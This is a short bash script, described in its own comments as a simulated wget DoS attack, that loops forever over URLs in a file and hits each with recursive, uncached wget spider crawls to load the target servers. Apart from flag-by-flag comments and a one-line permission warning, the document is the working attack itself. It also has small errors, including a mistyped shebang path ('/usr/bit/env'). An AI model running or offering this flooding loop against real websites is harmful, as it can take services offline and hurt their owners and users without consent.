#!/usr/bit/env bash

# script it designed to simulate a wget DoS attack on target URL's. Never use this against
# an IP address or target without explicit permission. The target IP addresses must be put
# in a file called urls.txt in the same directory.
# command break down
# --spider == Wget will behave as a Webspider. Only checks if the page is there
# -r == recursive == Wget downloads the requested docs & all documents that are linked & then linked to those, etc
# --delete-after == delete every single file it downloads AFTER downloading
# --timeout=1 == timeout in 1 second
# --tries=1 == 1 try, then move on
# --no-cache == disables server side cache
# -nh == disables generation of host-prefixed directories

while true; do
    for URL in $(cat urls.txt); do
        wget --spider -r --delete-after --timeout=1 --tries=1 --no-cache -nH $URL
    done
done